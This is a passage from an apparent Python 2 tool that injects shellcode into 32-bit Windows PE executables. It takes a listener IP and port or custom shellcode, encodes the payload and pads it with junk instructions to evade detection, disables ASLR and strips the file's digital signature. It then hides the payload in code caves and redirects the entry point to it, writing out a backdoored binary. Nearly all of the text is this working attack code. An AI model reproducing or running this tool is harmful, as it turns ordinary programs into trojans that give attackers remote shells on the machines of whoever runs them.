	elif (options.shellcode != None) and (options.hostIP != None or options.port != None):
		parser.error("Only provide custom shellcode OR Listener IP/port, cannot provide both")
	elif (options.shellcode != None) and (options.payload == 1):
		parser.error("Only provide payload OR custom shellcode, cannot provide both")
	
	if (options.port < 0 and options.port != None) or (options.offset < 0) or (options.num_Junk < 0) or (options.num_junk_iter < 0) or (options.num_Encode < 0):
		parser.error("Must use positive integer")

	if (options.num_Encode > 40):
		parser.error("Number of Encoding Instructions must be less than 40.  Currently using SHORT JMP instruction to loop backwards, which only supports up to 127 byte jumps")
		
	junkIterations = str(switchEndians(hex(options.num_junk_iter/2))[0])
	junkIterations = junkIterations[2:]

	if options.shellcode == None:
		if len(options.hostIP.split(".")) != 4:
			parser.error("Please enter a properly formatted IP address (e.g. 192.168.1.2)")
			exit()
		if (options.port > 65535) or (options.port < 1):
			parser.error("Please enter a valid port number between 1 and 65535")
			exit()
		backdoorShellcode = generateShellcode(options.hostIP, options.port, options.payload, backdoorMode)
	else:
		if backdoorMode:
			backdoorShellcode = formatCustomShellcode(options.shellcode)
		else:
			backdoorShellcode = convertToArray(options.shellcode)
			

	return options.file, options.output, backdoorShellcode, options.targetOS, options.offset, options.num_Junk, junkIterations, options.num_Encode


def main():
	peFilePath, outputFile, shellcode, OSesp, offset, junkCount, junkIterations, encoderCount = processInputParameters()

	pe = pefile.PE(peFilePath)
	if check_64bit(pe):
		print "Adding Shellcode to 64-bit executables is not currently implemented, please select a 32-bit application"
		exit()
	
	pe = make_writeable(pe)
	pe = disable_aslr(pe)
	pe = removeSignature(pe)	# this removes the digital signature, Windows still throws an unsigned warning, but probably better than an Invalid warning

	# set global variables based on command line arguments
	generateJunkInstr(junkCount, junkIterations)
	generateEncoderDecoder(encoderCount)
	encodeShellcode(shellcode)

	# find caves and preserved original entry instructions
	caveInfo = findCaves(peFilePath,offset)
	origInstrArray = getEntryPointInstr(pe)
	jmpInstr = getJmpCode(getVirtAddr(pe, getEntryPoint(pe)), caveInfo[1])

	# write backdoor code to file
	pe = writeCode(pe, getEntryPoint(pe), jmpInstr)
	pe = writeBackdoorCode(pe, caveInfo, origInstrArray, OSesp)
	
	saveFile(pe, outputFile)
	
if __name__ == '__main__':
    main()
